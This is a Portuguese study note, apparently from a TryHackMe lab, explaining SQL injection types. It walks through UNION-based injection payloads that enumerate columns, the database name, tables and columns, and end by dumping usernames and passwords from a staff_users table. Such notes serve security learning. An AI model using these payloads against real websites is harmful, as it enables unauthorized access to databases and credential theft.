**In-Band SQL Injection**

- É a maneira "mais fácil" de detectar e explorar uma falha de SQLi
- Se chama "In-Band" pelo usuário utilizar o mesmo meio, ou "canal/banda" para explorar a falha e visualizar os resultados dos seus testes
- Pode visualizar, extrair os dados pela própria página web utilizada pra explorar

**Error-Band SQL Injection**

- Você pode obter informações da estrutura de um banco de dados visualizando os erros reportados diretamente pela página web

**UNION-Based SQL Injection**

- Maneira de retornar diversas informações utilizando o operador UNION numa consulta com SELECT

**Boolean SQLi**

- Boolean-based SQL Injection é um tipo de ataque em que a resposta da aplicação mostra apenas dois resultados possíveis (como verdadeiro/falso, sim/não, 1/0).
Essas respostas indicam se o payload de injeção funcionou ou não.

- Mesmo parecendo limitado, é possível descobrir toda a estrutura e conteúdo do banco de dados só com essas respostas binárias.
---

**Pratice**

1. Queremos verificar a **existência de um possível SQLi**

```
https://website.thm/article?id='
```

**Exemplo de erro**

```
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
```

2. Após verificar e comprovar que existe, como um Erro na tela, podemos tentar enumerar com o operador UNION até retornar a **quantidade exata de colunas**, por exemplo:

```
https://website.thm/article?id=0 UNION SELECT 1
```

- **...**

```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```

3. Já que sabemos o número exato de colunas, temos que saber o **nome do banco de dados**

```
https://website.thm/article?id=1 UNION SELECT 1,2,database()
```

4. Diante do nome do banco de dados, agora queremos saber **quais são as tabelas** que esse banco possui:

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

5. De posse do nome das tabelas, queremos saber **quais são as colunas** existentes nessa tabela

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

6. Agora queremos recuperar os **valores das colunas** retornadas na consulta anterior (username, password):

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
```